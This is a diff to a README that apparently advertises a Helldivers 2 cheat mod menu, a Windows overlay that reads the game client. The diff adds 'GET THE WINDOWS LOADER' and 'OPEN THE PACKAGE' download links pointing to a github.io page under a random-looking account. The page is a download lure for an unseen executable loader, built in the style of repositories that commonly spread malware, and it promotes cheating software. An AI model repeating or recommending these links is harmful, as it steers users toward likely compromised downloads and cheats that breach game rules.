@@ -6,7 +6,7 @@ A Helldivers 2 mod menu is a Windows overlay that reads the running client from 
 
 # 📥 **LOADER PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS LOADER**]( )
+## [⬇️ **GET THE WINDOWS LOADER**](https://wpkunnjqaxsr.github.io/Helldivers-2-Cheats-Mod-Menu/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ A Helldivers 2 mod menu is a Windows overlay that reads the running client from 
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt="preview image">
+<img src="https://github.com/wpkunnjqaxsr/Helldivers-2-Cheats-Mod-Menu/blob/main/Helldivers-2-cheats.jpg?raw=true" width="1280" height="720" alt="preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://wpkunnjqaxsr.github.io/Helldivers-2-Cheats-Mod-Menu/)
 
 ---
 
